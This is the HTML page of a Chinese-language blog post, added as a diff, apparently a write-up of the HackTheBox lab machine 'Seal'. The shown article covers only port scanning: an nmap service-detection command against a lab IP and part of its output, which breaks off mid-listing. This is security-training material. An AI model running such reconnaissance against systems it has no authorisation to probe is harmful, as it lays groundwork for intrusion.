@@ -1,0 +1,1044 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="每周练手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Seal">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2021/12/13/HTB/Seal/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="每周练手">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/3ebb6fead558552c03f68a5895fb3d15.png">
+<meta property="article:published_time" content="2021-12-13T13:44:00.000Z">
+<meta property="article:modified_time" content="2022-04-14T10:56:59.602Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/3ebb6fead558552c03f68a5895fb3d15.png">
+  
+  
+  
+  <title>HackTheBox - Seal - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox - Seal"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-12-13 21:44" pubdate>
+          2021年12月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          66 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HackTheBox"
+        id="heading-d9fb08be3ed131369df5d4aa808dac70" role="tab" data-toggle="collapse" href="#collapse-d9fb08be3ed131369df5d4aa808dac70"
+        aria-expanded="true"
+      >
+        HackTheBox
+        <span class="list-group-count">(16)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-d9fb08be3ed131369df5d4aa808dac70"
+           role="tabpanel" aria-labelledby="heading-d9fb08be3ed131369df5d4aa808dac70">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - BountyHunter</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Cap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Driver</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Horizontall</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Intelligence/" title="HackTheBox - Intelligence"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Intelligence</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Monitors/" title="HackTheBox - Monitors"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Monitors</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Previse/" title="HackTheBox - Previse"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Previse</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Schooled/" title="HackTheBox - Schooled"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Schooled</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">HackTheBox - Seal</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Shibboleth</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Sink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Spider</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Archetype</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/05/19/HTB/Unicode/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/dynstr/" title="HackTheBox - dynstr"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - dynstr</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox - Seal</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月14日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="0x01-端口信息"><a href="#0x01-端口信息" class="headerlink" title="0x01 端口信息"></a>0x01 端口信息</h1><p>使用nmap对靶机进行端口探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC -sV -v 10.10.10.22<br></code></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>    <span class="hljs-variable">VERSION</span><br><span class="hljs-number">22</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">ssh</span>        <span class="hljs-title class_">Open</span>SSH <span class="hljs-number">8.2</span>p1 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.2</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-operator">|</span> <span class="hljs-variable">ssh</span><span class="hljs-operator">-</span><span class="hljs-variable">hostkey</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-number">3072</span> <span class="hljs-number">4</span>b:<span class="hljs-number">89</span>:<span class="hljs-number">47</span>:<span class="hljs-number">39</span>:<span class="hljs-number">67</span>:<span class="hljs-number">3</span>d:<span class="hljs-number">07</span>:<span class="hljs-number">31</span>:<span class="hljs-number">5</span>e:<span class="hljs-number">3</span>f:<span class="hljs-number">4</span>c:<span class="hljs-number">27</span>:<span class="hljs-number">41</span>:<span class="hljs-number">1</span>f:<span class="hljs-variable">f9</span>:<span class="hljs-number">67</span> (<span class="hljs-variable">RSA</span>)<br><span class="hljs-operator">|</span>   <span class="hljs-number">256</span> <span class="hljs-number">04</span>:<span class="hljs-variable">a7</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">39</span>:<span class="hljs-number">95</span>:<span class="hljs-number">65</span>:<span class="hljs-variable">c5</span>:<span class="hljs-variable">b0</span>:<span class="hljs-number">8</span>d:<span class="hljs-variable">d5</span>:<span class="hljs-number">49</span>:<span class="hljs-number">2</span>e:<span class="hljs-variable">d8</span>:<span class="hljs-number">44</span>:<span class="hljs-number">00</span>:<span class="hljs-number">36</span> (<span class="hljs-variable">ECDSA</span>)<br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-number">256</span> <span class="hljs-variable">b4</span>:<span class="hljs-number">5</span>e:<span class="hljs-number">83</span>:<span class="hljs-number">93</span>:<span class="hljs-variable">c5</span>:<span class="hljs-number">42</span>:<span class="hljs-number">49</span>:<span class="hljs-variable">de</span>:<span class="hljs-number">71</span>:<span class="hljs-number">25</span>:<span class="hljs-number">92</span>:<span class="hljs-number">71</span>:<span class="hljs-number">23</span>:<span class="hljs-variable">b1</span>:<span class="hljs-number">85</span>:<span class="hljs-number">54</span> (<span class="hljs-variable">ED25519</span>)<br><span class="hljs-number">443</span>/<span class="hljs-variable">tcp</span>  <span class="hljs-variable">open</span>  <span class="hljs-variable">ssl</span>/<span class="hljs-variable">http</span>   <span class="hljs-variable">nginx</span> <span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (<span class="hljs-title class_">Ubuntu</span>)<br><span class="hljs-operator">|</span> <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">methods</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-title class_">Supported</span> <span class="hljs-title class_">Methods</span>: <span class="hljs-variable">OPTIONS</span> <span class="hljs-variable">GET</span> <span class="hljs-variable">HEAD</span> <span class="hljs-variable">POST</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">server</span><span class="hljs-operator">-</span><span class="hljs-variable">header</span>: <span class="hljs-variable">nginx</span>/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (<span class="hljs-title class_">Ubuntu</span>)<br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">title</span>: <span class="hljs-title class_">Seal</span> <span class="hljs-title class_">Market</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">ssl</span><span class="hljs-operator">-</span><span class="hljs-variable">cert</span>: <span class="hljs-title class_">Subject</span>: <span class="hljs-variable">commonName</span><span class="hljs-operator">=</span><span class="hljs-variable">seal</span>.<span class="hljs-property">htb</span>/<span class="hljs-variable">organizationName</span><span class="hljs-operator">=</span><span class="hljs-title class_">Seal</span> <span class="hljs-title class_">Pvt</span> <span class="hljs-title class_">Ltd</span>/<span class="hljs-variable">stateOrProvinceName</span><span class="hljs-operator">=</span><span class="hljs-title class_">London</span>/<span class="hljs-variable">countryName</span><span class="hljs-operator">=</span><span class="hljs-variable">UK</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Issuer</span>: <span class="hljs-variable">commonName</span><span class="hljs-operator">=</span><span class="hljs-variable">seal</span>.<span class="hljs-property">htb</span>/<span class="hljs-variable">organizationName</span><span class="hljs-operator">=</span><span class="hljs-title class_">Seal</span> <span class="hljs-title class_">Pvt</span> <span class="hljs-title class_">Ltd</span>/<span class="hljs-variable">stateOrProvinceName</span><span class="hljs-operator">=</span><span class="hljs-title class_">London</span>/<span class="hljs-variable">countryName</span><span class="hljs-operator">=</span><span class="hljs-variable">UK</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Public</span> <span class="hljs-title class_">Key</span> <span class="hljs-variable">type</span>: <span class="hljs-variable">rsa</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Public</span> <span class="hljs-title class_">Key</span> <span class="hljs-variable">bits</span>: <span class="hljs-number">2048</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Signature</span> <span class="hljs-title class_">Algorithm</span>: <span class="hljs-variable">sha256WithRSAEncryption</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Not</span> <span class="hljs-variable">valid</span> <span class="hljs-variable">before</span>: <span class="hljs-number">2021</span><span class="hljs-number">-05</span><span class="hljs-number">-05</span>T10:<span class="hljs-number">24</span>:<span class="hljs-number">03</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Not</span> <span class="hljs-variable">valid</span> <span class="hljs-variable">after</span>:  <span class="hljs-number">2022</span><span class="hljs-number">-05</span><span class="hljs-number">-05</span>T10:<span class="hljs-number">24</span>:<span class="hljs-number">03</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">MD5</span>:   <span class="hljs-number">9</span>c4f <span class="hljs-number">991</span>a <span class="hljs-variable">bb97</span> <span class="hljs-number">192</span>c <span class="hljs-variable">df5a</span> <span class="hljs-variable">c513</span> <span class="hljs-number">057</span>d <span class="hljs-number">4</span>d21<br><span class="hljs-operator">|</span><span class="hljs-variable">_SHA</span><span class="hljs-number">-1</span>: <span class="hljs-number">0</span>de4 <span class="hljs-number">6873</span> <span class="hljs-number">0</span>ab7 <span class="hljs-number">3</span>f90 <span class="hljs-variable">c317</span> <span class="hljs-number">0</span>f7b <span class="hljs-number">872</span>f <span class="hljs-number">155</span>b <span class="hljs-number">305</span>e <span class="hljs-number">54</span>ef<br><span class="hljs-operator">|</span> <span class="hljs-variable">tls</span><span class="hljs-operator">-</span><span class="hljs-variable">alpn</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-variable">http</span>/<span class="hljs-number">1.1</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">tls</span><span class="hljs-operator">-</span><span class="hljs-variable">nextprotoneg</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-variable">http</span>/<span class="hljs-number">1.1</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <span class="hljs-title class_">Unauthorized</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Mon</span>, <span class="hljs-number">13</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">2021</span> <span class="hljs-number">01</span>:<span class="hljs-number">34</span>:<span class="hljs-number">13</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">JSESSIONID</span><span class="hljs-operator">=</span><span class="hljs-variable">node0z5n4sbc9hnjors2ulsqy6jnq155</span>.<span class="hljs-property">node0</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Expires</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">01</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">utf</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GetRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <span class="hljs-title class_">Unauthorized</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Mon</span>, <span class="hljs-number">13</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">2021</span> <span class="hljs-number">01</span>:<span class="hljs-number">34</span>:<span class="hljs-number">08</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">JSESSIONID</span><span class="hljs-operator">=</span><span class="hljs-variable">node09xtpsxy6z9pabh0g6yyqtajg153</span>.<span class="hljs-property">node0</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Expires</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">01</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">utf</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">HTTPOptions</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <span class="hljs-variable">OK</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Mon</span>, <span class="hljs-number">13</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">2021</span> <span class="hljs-number">01</span>:<span class="hljs-number">34</span>:<span class="hljs-number">09</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">JSESSIONID</span><span class="hljs-operator">=</span><span class="hljs-variable">node01nxswyk2xedhj14uol8ldn80oh154</span>.<span class="hljs-property">node0</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Expires</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">01</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">utf</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Allow</span>: <span class="hljs-variable">GET</span>,<span class="hljs-variable">HEAD</span>,<span class="hljs-variable">POST</span>,<span class="hljs-variable">OPTIONS</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">RPCCheck</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">400</span> <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">OTEXT</span><span class="hljs-operator">=</span><span class="hljs-number">0x80</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span>iso<span 